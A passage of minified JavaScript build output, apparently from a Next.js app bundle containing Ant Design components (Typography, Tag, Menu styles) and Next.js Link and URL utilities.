0,"aria-label":eH?.toString(),title:O,...Q},t.createElement(q,{enableMeasure:eP&&!eT,text:M,rows:e$,width:eL,onEllipsis:eV,expanded:ew,miscDeps:[el,ew,ec,Y,ei,U].concat((0,r.default)(J.map(t=>e[t])))},(r,n)=>{var a;let s,l,c;return function({mark:e,code:r,underline:o,delete:n,strong:a,keyboard:i,italic:s},l){let c=l;function u(e,r){r&&(c=t.createElement(e,{},c))}return u("strong",a),u("u",o),u("del",n),u("code",r),u("mark",e),u("kbd",i),u("i",s),c}(e,t.createElement(t.Fragment,null,r.length>0&&n&&!ew&&eH?t.createElement("span",{key:"show-content","aria-hidden":!0},r):r,[(a=n)&&!ew&&t.createElement("span",{"aria-hidden":!0,key:"ellipsis"},"..."),eC.suffix,(s=a&&(()=>{let{expandable:e,symbol:r}=eC;return e?t.createElement("button",{type:"button",key:"expand",className:`${K}-${ew?"collapse":"expand"}`,onClick:e=>{var t;ek((t={expanded:!ew}).expanded),eC.onExpand?.(e,t)},"aria-label":ew?U.collapse:U?.expand},"function"==typeof r?r(ew):r):null})(),l=(()=>{if(!Y)return;let{icon:e,tooltip:r,tabIndex:n}=Z,a=(0,i.toArray)(r)[0]||U?.edit,s="string"==typeof a?a:"";return er.includes("icon")?t.createElement(g.default,{key:"edit",title:!1===r?"":a},t.createElement("button",{type:"button",ref:X,className:`${K}-edit`,onClick:ea,"aria-label":s,tabIndex:n},e||t.createElement(o.default,{role:"button"}))):null})(),c=ei?t.createElement(H,{key:"copy",...es,prefixCls:K,copied:el,locale:U,onCopy:eu,loading:ec,iconOnly:!(0,d.default)(M)}):null,s||l||c?t.createElement("span",{key:"operations",className:`${K}-actions`,onMouseEnter:()=>ej(!0),onMouseLeave:()=>ej(!1)},s,l,c):null)]))}))))}),K=t.forwardRef((e,r)=>{let{ellipsis:o,rel:n,children:a,navigate:i,...s}=e,l={...s,rel:void 0===n&&"_blank"===s.target?"noopener noreferrer":n};return t.createElement(X,{...l,ref:r,ellipsis:!!o,component:"a"},a)}),Q=t.forwardRef((e,r)=>{let{children:o,...n}=e;return t.createElement(X,{ref:r,...n,component:"div"},o)}),Y=t.forwardRef((e,r)=>{let{ellipsis:o,children:n,...i}=e,s=t.useMemo(()=>o&&"object"==typeof o?(0,a.omit)(o,["expandable","rows"]):o,[o]);return t.createElement(X,{ref:r,...i,ellipsis:s,component:"span"},n)}),Z=[1,2,3,4,5],ee=t.forwardRef((e,r)=>{let{level:o=1,children:n,...a}=e,i=Z.includes(o)?`h${o}`:"h1";return t.createElement(X,{ref:r,...a,component:i},n)});R.Text=Y,R.Link=K,R.Title=ee,R.Paragraph=Q,e.s(["Typography",0,R],98586)},63113,20244,49181,83773,e=>{"use strict";var t=e.i(71645),r=e.i(64517),o=e.i(50824),n=e.i(8850),a=e.i(87414);let i=function(...e){let t={};return e.forEach(e=>{e&&Object.keys(e).forEach(r=>{void 0!==e[r]&&(t[r]=e[r])})}),t};var s=e.i(76398);let l={},c=(e,t)=>{if(!e&&(!1===e||!1===t||null===t))return!1;if(void 0===e&&void 0===t)return null;let r={closeIcon:"boolean"!=typeof t&&null!==t?t:void 0};return e&&"object"==typeof e&&(r={...r,...e}),r};e.s(["pickClosable",0,e=>{if(!e)return;let{closable:t,closeIcon:r}=e;return{closable:t,closeIcon:r}},"useClosable",0,(e,u,d=l)=>{let[p]=(0,n.useLocale)("global",a.default.global);return t.default.useMemo(()=>((e,n,a=l,u="Close")=>{let d=c(e?.closable,e?.closeIcon),p=c(n?.closable,n?.closeIcon),m={closeIcon:t.default.createElement(r.default,null),...a},f=!1!==d&&(d?i(m,p,d):!1!==p&&(p?i(m,p):!!m.closable&&m)),g="boolean"!=typeof f&&!!f?.disabled;if(!1===f)return[!1,null,g,{}];let[h,v]=((e,r,n)=>{let{closeIconRender:a}=r,{closeIcon:i,...l}=e,c=i,u=(0,o.default)(l,!0);return(0,s.default)(c)&&(a&&(c=a(c)),c=t.default.isValidElement(c)?t.default.cloneElement(c,{"aria-label":n,...c.props,...u}):t.default.createElement("span",{"aria-label":n,...u},c)),[c,u]})(f,m,u);return[!0,h,g,v]})(e,u,{closeIcon:t.default.createElement(r.default,null),...d},p.close),[e,u,d,p.close])}],63113);var u=e.i(7670),d=e.i(42064),p=e.i(37328);e.i(96059);var m=e.i(15654);e.i(62370);var f=e.i(35551),g=e.i(71070),h=e.i(991),v=e.i(83293),b=e.i(46422),y=e.i(38378);let S=e=>{let{lineWidth:t,fontSizeIcon:r,calc:o}=e,n=e.fontSizeSM;return(0,y.mergeToken)(e,{tagFontSize:n,tagLineHeight:(0,m.unit)(o(e.lineHeightSM).mul(n).equal()),tagIconSize:o(r).sub(o(t).mul(2)).equal(),tagPaddingHorizontal:8,tagBorderlessBg:e.defaultBg})},x=e=>{let t=(0,h.isBright)(new g.AggregationColor(e.colorBgSolid),"#fff")?"#000":"#fff";return{defaultBg:new f.FastColor(e.colorFillTertiary).onBackground(e.colorBgContainer).toHexString(),defaultColor:e.colorText,solidTextColor:t}},C=(0,b.genStyleHooks)("Tag",e=>(e=>{let{paddingXXS:t,lineWidth:r,tagPaddingHorizontal:o,componentCls:n,calc:a}=e,i=a(o).sub(r).equal(),s=a(t).sub(r).equal();return{[n]:{...(0,v.resetComponent)(e),display:"inline-block",height:"auto",paddingInline:i,fontSize:e.tagFontSize,lineHeight:e.tagLineHeight,whiteSpace:"nowrap",backgroundColor:e.defaultBg,border:`${(0,m.unit)(e.lineWidth)} ${e.lineType} ${e.colorBorder}`,borderRadius:e.borderRadiusSM,opacity:1,transition:`all ${e.motionDurationMid}`,textAlign:"start",position:"relative",[`&${n}-rtl`]:{direction:"rtl"},"&, a, a:hover":{color:e.defaultColor},[`${n}-close-icon`]:{marginInlineStart:s,fontSize:e.tagIconSize,color:e.colorIcon,cursor:"pointer",transition:`all ${e.motionDurationMid}`,"&:hover":{color:e.colorTextHeading}},"&-checkable":{backgroundColor:"transparent",borderColor:"transparent",cursor:"pointer",[`&:not(${n}-checkable-checked):hover`]:{color:e.colorPrimary,backgroundColor:e.colorFillSecondary},"&:active, &-checked":{color:e.colorTextLightSolid},"&-checked":{backgroundColor:e.colorPrimary,"&:hover":{backgroundColor:e.colorPrimaryHover}},"&:active":{backgroundColor:e.colorPrimaryActive},"&-disabled":{cursor:"not-allowed",[`&:not(${n}-checkable-checked)`]:{color:e.colorTextDisabled,"&:hover":{backgroundColor:"transparent"}},[`&${n}-checkable-checked`]:{color:e.colorTextDisabled,backgroundColor:e.colorBgContainerDisabled},"&:hover, &:active":{backgroundColor:e.colorBgContainerDisabled,color:e.colorTextDisabled},[`&:not(${n}-checkable-checked):hover`]:{color:e.colorTextDisabled}},"&-group":{display:"flex",flexWrap:"wrap",gap:e.paddingXS}},"&-hidden":{display:"none"},[`> ${e.iconCls} + span, > span + ${e.iconCls}`]:{marginInlineStart:i}},[`&${e.componentCls}-solid`]:{borderColor:"transparent",color:e.colorTextLightSolid,backgroundColor:e.colorBgSolid,[`&${n}-default`]:{color:e.solidTextColor}},[`${n}-filled`]:{borderColor:"transparent",backgroundColor:e.tagBorderlessBg},[`&${n}-disabled`]:{color:e.colorTextDisabled,cursor:"not-allowed",backgroundColor:e.colorBgContainerDisabled,a:{cursor:"not-allowed",pointerEvents:"none",color:e.colorTextDisabled,"&:hover":{color:e.colorTextDisabled}},"a&":{"&:hover, &:active":{color:e.colorTextDisabled}},[`&${n}-outlined`]:{borderColor:e.colorBorderDisabled},[`&${n}-solid, &${n}-filled`]:{color:e.colorTextDisabled,[`${n}-close-icon`]:{color:e.colorTextDisabled}},[`${n}-close-icon`]:{cursor:"not-allowed",color:e.colorTextDisabled,"&:hover":{color:e.colorTextDisabled}}}}})(S(e)),x);e.s(["default",0,C,"prepareComponentToken",0,x,"prepareToken",0,S],20244);let w=t.forwardRef((e,r)=>{let{prefixCls:o,style:n,className:a,checked:i,children:s,icon:l,onChange:c,onClick:m,disabled:f,...g}=e,{getPrefixCls:h,tag:v}=t.useContext(d.ConfigContext),b=t.useContext(p.default),y=f??b,S=h("tag",o),[x,w]=C(S),k=(0,u.clsx)(S,`${S}-checkable`,{[`${S}-checkable-checked`]:i,[`${S}-checkable-disabled`]:y},v?.className,a,x,w);return t.createElement("span",{...g,ref:r,style:{...n,...v?.style},className:k,onClick:e=>{y||(c?.(!i),m?.(e))}},l,t.createElement("span",null,s))});e.s(["default",0,w],49181),e.i(47167);var k=e.i(8211);e.i(63335);var P=e.i(30294),$=e.i(11517),E=e.i(21883);let T=t.default.forwardRef((e,r)=>{let{id:n,prefixCls:a,rootClassName:i,className:s,style:l,classNames:c,styles:p,disabled:m,options:f,value:g,defaultValue:h,onChange:v,multiple:b,...y}=e,{getPrefixCls:S,direction:x,className:T,style:I,classNames:R,styles:M}=(0,d.useComponentConfig)("tag"),A=S("tag",a),D=`${A}-checkable-group`,L=(0,E.default)(A),[_,O]=C(A,L),[j,F]=(0,$.useMergeSemantic)([R,c],[M,p],{props:e}),N=(0,t.useMemo)(()=>Array.isArray(f)?f.map(e=>e&&"object"==typeof e?e:{value:e,label:e}):[],[f]),[V,B]=(0,P.useControlledState)(h,g),H=t.default.useRef(null);(0,t.useImperativeHandle)(r,()=>({nativeElement:H.current}));let z=(0,o.default)(y,{aria:!0,data:!0});return t.default.createElement("div",{...z,className:(0,u.clsx)(D,T,i,{[`${D}-disabled`]:m,[`${D}-rtl`]:"rtl"===x},_,O,s,j.root),style:{...I,...F.root,...l},id:n,ref:H},N.map(e=>t.default.createElement(w,{key:e.value,className:(0,u.clsx)(`${D}-item`,j.item),style:F.item,checked:b?(V||[]).includes(e.value):V===e.value,onChange:t=>((e,t)=>{let r=null;if(b){let o=V||[];r=e?[].concat((0,k.default)(o),[t.value]):o.filter(e=>e!==t.value)}else r=e?t.value:null;B(r),v?.(r)})(t,e),disabled:m},e.label)))});e.s(["default",0,T],83773)},50664,e=>{"use strict";var t=e.i(71645);e.i(62370);var r=e.i(35551),o=e.i(2779);function n(e,n){let{color:a,variant:i,bordered:s}=e;return t.useMemo(()=>{let e,t=a?.endsWith("-inverse");e=i||(t?"solid":!1===s?"filled":n||"filled");let l=t?a?.replace("-inverse",""):a,c=(0,o.isPresetColor)(a),u=(0,o.isPresetStatusColor)(a),d={};if(!c&&!u&&l)if("solid"===e)d.backgroundColor=a;else{let t=new r.FastColor(l).toHsl();t.l=.95,d.backgroundColor=new r.FastColor(t).toHexString(),d.color=a,"outlined"===e&&(d.borderColor=a)}return[e,l,c,u,d]},[a,i,s,n])}e.s(["default",()=>n])},62218,e=>{"use strict";e.i(47167);var t=e.i(71645);e.i(63335);var r=e.i(51095),o=e.i(7670),n=e.i(63113),a=e.i(11517),i=e.i(63731),s=e.i(21872),l=e.i(42064),c=e.i(37328),u=e.i(49181),d=e.i(83773),p=e.i(50664),m=e.i(20244),f=e.i(3541),g=e.i(46422);let h=(0,g.genSubStyleComponent)(["Tag","preset"],e=>{let t;return t=(0,m.prepareToken)(e),(0,f.genPresetColor)(t,(e,{textColor:r,lightBorderColor:o,lightColor:n,darkColor:a})=>({[`${t.componentCls}${t.componentCls}-${e}:not(${t.componentCls}-disabled)`]:{[`&${t.componentCls}-outlined`]:{backgroundColor:n,borderColor:o,color:r},[`&${t.componentCls}-solid`]:{backgroundColor:a,borderColor:a,color:t.colorTextLightSolid},[`&${t.componentCls}-filled`]:{backgroundColor:n,color:r}}}))},m.prepareComponentToken),v=(e,t,r)=>{let o="string"!=typeof r?r:r.charAt(0).toUpperCase()+r.slice(1);return{[`${e.componentCls}${e.componentCls}-${t}:not(${e.componentCls}-disabled)`]:{[`&${e.componentCls}-outlined`]:{backgroundColor:e[`color${o}Bg`],borderColor:e[`color${o}Border`],color:e[`color${r}`]},[`&${e.componentCls}-solid`]:{backgroundColor:e[`color${r}`],borderColor:e[`color${r}`]},[`&${e.componentCls}-filled`]:{backgroundColor:e[`color${o}Bg`],color:e[`color${r}`]}}}},b=(0,g.genSubStyleComponent)(["Tag","status"],e=>{let t=(0,m.prepareToken)(e);return[v(t,"success","Success"),v(t,"processing","Info"),v(t,"error","Error"),v(t,"warning","Warning")]},m.prepareComponentToken),y=t.forwardRef((e,u)=>{let{prefixCls:d,className:f,rootClassName:g,style:v,children:y,icon:S,color:x,variant:C,onClose:w,bordered:k,disabled:P,href:$,target:E,styles:T,classNames:I,...R}=e,{getPrefixCls:M,direction:A,className:D,variant:L,style:_,classNames:O,styles:j}=(0,l.useComponentConfig)("tag"),[F,N,V,B,H]=(0,p.default)(e,L),z=V||B,U=t.useContext(c.default),W=P??U,{tag:q}=t.useContext(l.ConfigContext),[G,J]=t.useState(!0),X=(0,r.omit)(R,["closeIcon","closable"]),K={...e,color:N,variant:F,disabled:W,href:$,target:E,icon:S},[Q,Y]=(0,a.useMergeSemantic)([O,I],[j,T],{props:K}),Z=t.useMemo(()=>{let e={...Y.root,..._,...v};return W||(e={...H,...e}),e},[Y.root,_,v,H,W]),ee=M("tag",d),[et,er]=(0,m.default)(ee),eo=(0,o.clsx)(ee,D,Q.root,`${ee}-${F}`,{[`${ee}-${N}`]:z,[`${ee}-hidden`]:!G,[`${ee}-rtl`]:"rtl"===A,[`${ee}-disabled`]:W},f,g,et,er),en=e=>{W||(e.stopPropagation(),w?.(e),e.defaultPrevented||J(!1))},[,ea]=(0,n.useClosable)((0,n.pickClosable)(e),(0,n.pickClosable)(q),{closable:!1,closeIconRender:e=>{let r=t.createElement("span",{className:`${ee}-close-icon`,onClick:en},e);return(0,i.replaceElement)(e,r,e=>({onClick:t=>{e?.onClick?.(t),en(t)},className:(0,o.clsx)(e?.className,`${ee}-close-icon`)}))}}),ei="function"==typeof R.onClick||y&&"a"===y.type,es=(0,i.cloneElement)(S,{className:(0,o.clsx)(t.isValidElement(S)?S.props?.className:void 0,Q.icon),style:Y.icon}),el=es?t.createElement(t.Fragment,null,es,y&&t.createElement("span",{className:Q.content,style:Y.content},y)):y,ec=t.createElement($?"a":"span",{...X,ref:u,className:eo,style:Z,href:W?void 0:$,target:E,onClick:W?void 0:X.onClick,...$&&W?{"aria-disabled":!0}:{}},el,ea,V&&t.createElement(h,{key:"preset",prefixCls:ee}),B&&t.createElement(b,{key:"status",prefixCls:ee}));return ei?t.createElement(s.default,{component:"Tag"},ec):ec});y.CheckableTag=u.default,y.CheckableTagGroup=d.default,e.s(["Tag",0,y],62218)},34779,e=>{"use strict";e.i(47167);var t=e.i(71645);let r={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M832 64H192c-17.7 0-32 14.3-32 32v832c0 17.7 14.3 32 32 32h640c17.7 0 32-14.3 32-32V96c0-17.7-14.3-32-32-32zm-260 72h96v209.9L621.5 312 572 347.4V136zm220 752H232V136h280v296.9c0 3.3 1 6.6 3 9.3a15.9 15.9 0 0022.3 3.7l83.8-59.9 81.4 59.4c2.7 2 6 3.1 9.4 3.1 8.8 0 16-7.2 16-16V136h64v752z"}}]},name:"book",theme:"outlined"};var o=e.i(9583);function n(){return(n=Object.assign.bind()).apply(this,arguments)}let a=t.forwardRef((e,a)=>t.createElement(o.default,n({},e,{ref:a,icon:r})));e.s(["BookOutlined",0,a],34779)},98183,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var o={assign:function(){return l},searchParamsToUrlQuery:function(){return a},urlQueryToSearchParams:function(){return s}};for(var n in o)Object.defineProperty(r,n,{enumerable:!0,get:o[n]});function a(e){let t={};for(let[r,o]of e.entries()){let e=t[r];void 0===e?t[r]=o:Array.isArray(e)?e.push(o):t[r]=[e,o]}return t}function i(e){return"string"==typeof e?e:("number"!=typeof e||isNaN(e))&&"boolean"!=typeof e?"":String(e)}function s(e){let t=new URLSearchParams;for(let[r,o]of Object.entries(e))if(Array.isArray(o))for(let e of o)t.append(r,i(e));else t.set(r,i(o));return t}function l(e,...t){for(let r of t){for(let t of r.keys())e.delete(t);for(let[t,o]of r.entries())e.append(t,o)}return e}},95057,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var o={formatUrl:function(){return s},formatWithValidation:function(){return c},urlObjectKeys:function(){return l}};for(var n in o)Object.defineProperty(r,n,{enumerable:!0,get:o[n]});let a=e.r(90809)._(e.r(98183)),i=/https?|ftp|gopher|file/;function s(e){let{auth:t,hostname:r}=e,o=e.protocol||"",n=e.pathname||"",s=e.hash||"",l=e.query||"",c=!1;t=t?encodeURIComponent(t).replace(/%3A/i,":")+"@":"",e.host?c=t+e.host:r&&(c=t+(~r.indexOf(":")?`[${r}]`:r),e.port&&(c+=":"+e.port)),l&&"object"==typeof l&&(l=String(a.urlQueryToSearchParams(l)));let u=e.search||l&&`?${l}`||"";return o&&!o.endsWith(":")&&(o+=":"),e.slashes||(!o||i.test(o))&&!1!==c?(c="//"+(c||""),n&&"/"!==n[0]&&(n="/"+n)):c||(c=""),s&&"#"!==s[0]&&(s="#"+s),u&&"?"!==u[0]&&(u="?"+u),n=n.replace(/[?#]/g,encodeURIComponent),u=u.replace("#","%23"),`${o}${c}${n}${u}${s}`}let l=["auth","hash","host","hostname","href","path","pathname","port","protocol","query","search","slashes"];function c(e){return s(e)}},18581,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"useMergedRef",{enumerable:!0,get:function(){return n}});let o=e.r(71645);function n(e,t){let r=(0,o.useRef)(null),n=(0,o.useRef)(null);return(0,o.useCallback)(o=>{if(null===o){let e=r.current;e&&(r.current=null,e());let t=n.current;t&&(n.current=null,t())}else e&&(r.current=a(e,o)),t&&(n.current=a(t,o))},[e,t])}function a(e,t){if("function"!=typeof e)return e.current=t,()=>{e.current=null};{let r=e(t);return"function"==typeof r?r:()=>e(null)}}("function"==typeof r.default||"object"==typeof r.default&&null!==r.default)&&void 0===r.default.__esModule&&(Object.defineProperty(r.default,"__esModule",{value:!0}),Object.assign(r.default,r),t.exports=r.default)},18967,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var o={DecodeError:function(){return v},MiddlewareNotFoundError:function(){return x},MissingStaticPage:function(){return S},NormalizeError:function(){return b},PageNotFoundError:function(){return y},SP:function(){return g},ST:function(){return h},WEB_VITALS:function(){return a},execOnce:function(){return i},getDisplayName:function(){return d},getLocationOrigin:function(){return c},getURL:function(){return u},isAbsoluteUrl:function(){return l},isResSent:function(){return p},loadGetInitialProps:function(){return f},normalizeRepeatedSlashes:function(){return m},stringifyError:function(){return C}};for(var n in o)Object.defineProperty(r,n,{enumerable:!0,get:o[n]});let a=["CLS","FCP","FID","INP","LCP","TTFB"];function i(e){let t,r=!1;return(...o)=>(r||(r=!0,t=e(...o)),t)}let s=/^[a-zA-Z][a-zA-Z\d+\-.]*?:/,l=e=>s.test(e);function c(){let{protocol:e,hostname:t,port:r}=window.location;return`${e}//${t}${r?":"+r:""}`}function u(){let{href:e}=window.location,t=c();return e.substring(t.length)}function d(e){return"string"==typeof e?e:e.displayName||e.name||"Unknown"}function p(e){return e.finished||e.headersSent}function m(e){let t=e.split("?");return t[0].replace(/\\/g,"/").replace(/\/\/+/g,"/")+(t[1]?`?${t.slice(1).join("?")}`:"")}async function f(e,t){let r=t.res||t.ctx&&t.ctx.res;if(!e.getInitialProps)return t.ctx&&t.Component?{pageProps:await f(t.Component,t.ctx)}:{};let o=await e.getInitialProps(t);if(r&&p(r))return o;if(!o)throw Object.defineProperty(Error(`"${d(e)}.getInitialProps()" should resolve to an object. But found "${o}" instead.`),"__NEXT_ERROR_CODE",{value:"E394",enumerable:!1,configurable:!0});return o}let g="u">typeof performance,h=g&&["mark","measure","getEntriesByName"].every(e=>"function"==typeof performance[e]);class v extends Error{}class b extends Error{}class y extends Error{constructor(e){super(),this.code="ENOENT",this.name="PageNotFoundError",this.message=`Cannot find module for page: ${e}`}}class S extends Error{constructor(e,t){super(),this.message=`Failed to load static file for page: ${e} ${t}`}}class x extends Error{constructor(){super(),this.code="ENOENT",this.message="Cannot find the middleware module"}}function C(e){return JSON.stringify({message:e.message,stack:e.stack})}},73668,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"isLocalURL",{enumerable:!0,get:function(){return a}});let o=e.r(18967),n=e.r(52817);function a(e){if(!(0,o.isAbsoluteUrl)(e))return!0;try{let t=(0,o.getLocationOrigin)(),r=new URL(e,t);return r.origin===t&&(0,n.hasBasePath)(r.pathname)}catch(e){return!1}}},84508,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0}),Object.defineProperty(r,"errorOnce",{enumerable:!0,get:function(){return o}});let o=e=>{}},22016,(e,t,r)=>{"use strict";Object.defineProperty(r,"__esModule",{value:!0});var o={default:function(){return v},useLinkStatus:function(){return y}};for(var n in o)Object.defineProperty(r,n,{enumerable:!0,get:o[n]});let a=e.r(90809),i=e.r(43476),s=a._(e.r(71645)),l=e.r(95057),c=e.r(8372),u=e.r(18581),d=e.r(18967),p=e.r(5550);e.r(33525);let m=e.r(91949),f=e.r(73668),g=e.r(9396);function h(e){return"string"==typeof e?e:(0,l.formatUrl)(e)}function v(t){var r;let o,n,a,[l,v]=(0,s.useOptimistic)(m.IDLE_LINK_STATUS),y=(0,s.useRef)(null),{href:S,as:x,children:C,prefetch:w=null,passHref:k,replace:P,shallow:$,scroll:E,onClick:T,onMouseEnter:I,onTouchStart:R,legacyBehavior:M=!1,onNavigate:A,ref:D,unstable_dynamicOnHover:L,..._}=t;o=C,M&&("string"==typeof o||"number"==typeof o)&&(o=(0,i.jsx)("a",{children:o}));let O=s.default.useContext(c.AppRouterContext),j=!1!==w,F=!1!==w?null===(r=w)||"auto"===r?g.FetchStrategy.PPR:g.FetchStrategy.Full:g.FetchStrategy.PPR,{href:N,as:V}=s.default.useMemo(()=>{let e=h(S);return{href:e,as:x?h(x):e}},[S,x]);if(M){if(o?.$$typeof===Symbol.for("react.lazy"))throw Object.defineProperty(Error("`<Link legacyBehavior>` received a direct child that is either a Server Component, or JSX that was loaded with React.lazy(). This is not supported. Either remove legacyBehavior, or make the direct child a Client Component that renders the Link's `<a>` tag."),"__NEXT_ERROR_CODE",{value:"E863",enumerable:!1,configurable:!0});n=s.default.Children.only(o)}let B=M?n&&"object"==typeof n&&n.ref:D,H=s.default.useCallback(e=>(null!==O&&(y.current=(0,m.mountLinkInstance)(e,N,O,F,j,v)),()=>{y.current&&((0,m.unmountLinkForCurrentNavigation)(y.current),y.current=null),(0,m.unmountPrefetchableInstance)(e)}),[j,N,O,F,v]),z={ref:(0,u.useMergedRef)(H,B),onClick(t){M||"function"!=typeof T||T(t),M&&n.props&&"function"==typeof n.props.onClick&&n.props.onClick(t),!O||t.defaultPrevented||function(t,r,o,n,a,i,l){if("u">typeof window){let c,{nodeName:u}=t.currentTarget;if("A"===u.toUpperCase()&&((c=t.currentTarget.getAttribute("target"))&&"_self"!==c||t.metaKey||t.ctrlKey||t.shiftKey||t.altKey||t.nativeEvent&&2===t.nativeEvent.which)||t.currentTarget.hasAttribute("download"))return;if(!(0,f.isLocalURL)(r)){a&&(t.preventDefault(),location.replace(r));return}if(t.preventDefault(),l){let e=!1;if(l({preventDefault:()=>{e=!0}}),e)return}let{dispatchNavigateAction:d}=e.r(99781);s.default.startTransition(()=>{d(o||r,a?"replace":"push",i??!0,n.current)})}}(t,N,V,y,P,E,A)},onMouseEnter(e){M||"function"!=typeof I||I(e),M&&n.props&&"function"==typeof n.props.onMouseEnter&&n.props.onMouseEnter(e),O&&j&&(0,m.onNavigationIntent)(e.currentTarget,!0===L)},onTouchStart:function(e){M||"function"!=typeof R||R(e),M&&n.props&&"function"==typeof n.props.onTouchStart&&n.props.onTouchStart(e),O&&j&&(0,m.onNavigationIntent)(e.currentTarget,!0===L)}};return(0,d.isAbsoluteUrl)(V)?z.href=V:M&&!k&&("a"!==n.type||"href"in n.props)||(z.href=(0,p.addBasePath)(V)),a=M?s.default.cloneElement(n,z):(0,i.jsx)("a",{..._,...z,children:o}),(0,i.jsx)(b.Provider,{value:l,children:a})}e.r(84508);let b=(0,s.createContext)(m.IDLE_LINK_STATUS),y=()=>(0,s.useContext)(b);("function"==typeof r.default||"object"==typeof r.default&&null!==r.default)&&void 0===r.default.__esModule&&(Object.defineProperty(r.default,"__esModule",{value:!0}),Object.assign(r.default,r),t.exports=r.default)},92989,(e,t,r)=>{t.exports=e.r(76562)},60699,52199,e=>{"use strict";e.i(47167);var t=e.i(71645),r=e.i(13381),o=e.i(33578),o=o,n=e.i(90224),a=e.i(67384);e.i(63335);var i=e.i(51095),s=e.i(80251),l=e.i(7670),c=e.i(11517),u=e.i(13541),d=e.i(63731),p=e.i(42064),m=e.i(21883);let f=(0,t.createContext)({prefixCls:"",firstLevel:!0,inlineCollapsed:!1,styles:null,classNames:null});var g=e.i(50211),g=g;let h=e=>{let{prefixCls:r,className:o,dashed:n,...a}=e,{getPrefixCls:i}=t.useContext(p.ConfigContext),s=i("menu",r),c=(0,l.clsx)({[`${s}-item-divider-dashed`]:!!n},o);return t.createElement(g.default,{className:c,...a})};var v=e.i(65044),v=v,b=e.i(43081),y=e.i(91816);let S=e=>{let r,o,{className:a,children:s,icon:c,title:u,danger:p,extra:m}=e,{prefixCls:g,firstLevel:h,direction:S,disableMenuItemTitleTooltip:x,tooltip:C,inlineCollapsed:w,styles:k,classNames:P}=t.useContext(f),{siderCollapsed:$}=t.useContext(n.SiderContext),E=u;void 0===u?E=h?s:"":!1===u&&(E="");let T=!1===C?void 0:C,I=T&&void 0!==T.title?T.title:E,R={...T??null,title:I};$||w||(R.title=null,R.open=!1);let M=(0,b.toArray)(s).length,A=t.createElement(v.default,{...(0,i.omit)(e,["title","icon","danger"]),className:(0,l.clsx)(h?P?.item:P?.subMenu?.item,{[`${g}-item-danger`]:p,[`${g}-item-only-child`]:(c?M+1:M)===1},a),style:{...h?k?.item:k?.subMenu?.item,...e.style},title:"string"==typeof u?u:void 0},(0,d.cloneElement)(c,e=>({className:(0,l.clsx)(`${g}-item-icon`,h?P?.itemIcon:P?.subMenu?.itemIcon,e.className),style:{...h?k?.itemIcon:k?.subMenu?.itemIcon,...e.style}})),(r=s?.[0],o=t.createElement("span",{className:(0,l.clsx)(`${g}-title-content`,h?P?.itemContent:P?.subMenu?.itemContent,{[`${g}-title-content-with-extra`]:!!m||0===m}),style:h?k?.itemContent:k?.subMenu?.itemContent},s),(!c||t.isValidElement(s)&&"span"===s.type)&&s&&w&&h&&"string"==typeof r?t.createElement("div",{className:`${g}-inline-collapsed-noicon`},r.charAt(0)):o));if(!x&&!1!==C){let e=T&&T.placement?T.placement:"rtl"===S?"left":"right",r=`${g}-inline-collapsed-tooltip`,o=e=>({...e,root:(0,l.clsx)(r,e?.root)}),n=T&&"function"==typeof T.classNames?e=>o(T.classNames(e)):o(T?.classNames);A=t.createElement(y.default,{...R,placement:e,classNames:n},A)}return A};var x=e.i(32839),C=e.i(17206);let w=t.createContext(null),k=t.forwardRef((e,r)=>{let{children:o,...n}=e,a=t.useContext(w),i=t.useMemo(()=>({...a,...n}),[a,n.prefixCls,n.mode,n.selectable,n.rootClassName]),s=(0,x.supportNodeRef)(o),l=(0,x.useComposeRef)(r,s?(0,x.getNodeRef)(o):null);return t.createElement(w.Provider,{value:i},t.createElement(C.default,{space:!0},s?t.cloneElement(o,{ref:l}):o))});e.s(["OverrideProvider",0,k,"default",0,w],52199),e.i(96059);var P=e.i(15654);e.i(62370);var $=e.i(35551),E=e.i(83293),T=e.i(47580),I=e.i(64142),R=e.i(17356),M=e.i(46422),A=e.i(38378);let D=e=>(0,E.genFocusOutline)(e),L=(e,t)=>{let{componentCls:r,itemColor:o,itemSelectedColor:n,subMenuItemSelectedColor:a,groupTitleColor:i,itemBg:s,subMenuItemBg:l,itemSelectedBg:c,activeBarHeight:u,activeBarWidth:d,activeBarBorderWidth:p,motionDurationSlow:m,motionEaseInOut:f,motionEaseOut:g,itemPaddingInline:h,motionDurationMid:v,itemHoverColor:b,lineType:y,colorSplit:S,itemDisabledColor:x,dangerItemColor:C,dangerItemHoverColor:w,dangerItemSelectedColor:k,dangerItemActiveBg:$,dangerItemSelectedBg:E,popupBg:T,itemHoverBg:I,itemActiveBg:R,menuSubMenuBg:M,horizontalItemSelectedColor:A,horizontalItemSelectedBg:L,horizontalItemBorderRadius:_,horizontalItemHoverBg:O}=e;return{[`${r}-${t}, ${r}-${t} > ${r}`]:{color:o,background:s,[`&${r}-root:focus-visible`]:{...D(e)},[`${r}-item`]:{"&-group-title, &-extra":{color:i}},[`${r}-submenu-selected > ${r}-submenu-title`]:{color:a},[`${r}-item, ${r}-submenu-title`]:{color:o,[`&:not(${r}-item-disabled):focus-visible`]:{...D(e)}},[`${r}-item-disabled, ${r}-submenu-disabled`]:{color:`${x} !important`},[`${r}-item:not(${r}-item-selected):not(${r}-submenu-selected)`]:{[`&:hover, > ${r}-submenu-title:hover`]:{color:b}},[`&:not(${r}-horizontal)`]:{[`${r}-item:not(${r}-item-selected)`]:{"&:hover":{backgroundColor:I},"&:active":{backgroundColor:R}},[`${r}-submenu-title`]:{"&:hover":{backgroundColor:I},"&:active":{backgroundColor:R}}},[`${r}-item-danger`]:{color:C,[`&${r}-item:hover`]:{[`&:not(${r}-item-selected):not(${r}-submenu-selected)`]:{color:w}},[`&${r}-item:active`]:{background:$}},[`${r}-item a`]:{"&, &:hover":{color:"inherit"}},[`${r}-item-selected`]:{color:n,[`&${r}-item-danger`]:{color:k},"a, a:hover":{color:"inherit"}},[`& ${r}-item-selected`]:{backgroundColor:c,[`&${r}-item-danger`]:{backgroundColor:E}},[`&${r}-submenu > ${r}`]:{backgroundColor:M},[`&${r}-popup > 